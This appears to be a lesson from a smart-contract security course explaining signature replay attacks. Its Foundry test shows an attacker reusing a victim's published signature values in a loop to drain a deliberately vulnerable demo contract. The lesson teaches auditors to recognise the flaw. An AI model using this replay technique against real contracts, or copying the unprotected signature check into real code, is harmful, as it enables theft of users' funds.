---
title: Exploit - Signature Replay Minimized
---

_Follow along with the video lesson:_

---

### Exploit - Signature Replay Minimized

We need to talk about signature reply attacks, because they are painfully common in Web3.

We've got a great hands-on, [**Remix example**](https://remix.ethereum.org/#url=https://github.com/Cyfrin/sc-exploits-minimized/blob/main/src/signature-replay/SignatureReplay.sol&lang=en&optimize=false&runs=200&evmVersion=null&version=soljson-v0.8.20+commit.a1b79de6.js) in our [**sc-exploits-minimized**](https://github.com/Cyfrin/sc-exploits-minimized) repo to assist you in better understanding this attack vector. If you want to play with it in Remix, you're encouraged to do so, but I find it easier to bring up the [**SignatureReplayTest.t.sol**](https://github.com/Cyfrin/sc-exploits-minimized/blob/main/test/unit/SignatureReplayTest.t.sol) file in the sc-exploits-minimized repo locally.

```js
function test_signatureReplay() public {
    vm.startPrank(victim.addr);
    signatureReplay.deposit{value: startingAmount}();

    // These 3 lines happen off chain
    bytes32 structHash = keccak256(abi.encode(signatureReplay.TYPEHASH(), withdrawAmount));
    bytes32 digest = signatureReplay.getHashTypedDataV4(structHash); // This function will prepend the EIP-712 domain separator
    (uint8 v, bytes32 r, bytes32 s) = vm.sign(victim.key, digest);

    // Victim signs withdrawal of 1 ether, oh no! The signature is loose!
    // The V, R, and S values are live!
    signatureReplay.withdrawBySig(v, r, s, withdrawAmount);
    vm.stopPrank();

    assertEq(address(signatureReplay).balance, startingAmount - withdrawAmount);
    assertEq(signatureReplay.balances(victim.addr), startingAmount - withdrawAmount);

    vm.startPrank(attacker);
    while (address(signatureReplay).balance >= 1 ether) {
        signatureReplay.withdrawBySig(v, r, s, withdrawAmount);
    }
    vm.stopPrank();

    assertEq(address(signatureReplay).balance, 0);
    assertEq(signatureReplay.balances(victim.addr), 0);
}
```

In this test, we have a victim depositing funds to a protocol and then signing a transaction with `vm.sign`. The victim then calls `withdrawBySig` which broadcasts the `v, r, and s` values of the victims signature for this message, on-chain.

```js
signatureReplay.withdrawBySig(v, r, s, withdrawAmount);
```

From here, an attacker sees these values on-chain and decides to call the `withdrawBySig` function with them repeatedly until all funds are removed from the protocol.

Granted, in this example the attacker isn't _stealing_ anything, you could see the potential exploits that could arise from this sort of vulnerability.

In the next lesson, we'll write up a `PoC` to showcase exactly how this could be exploited within `Boss Bridge`. See you there!
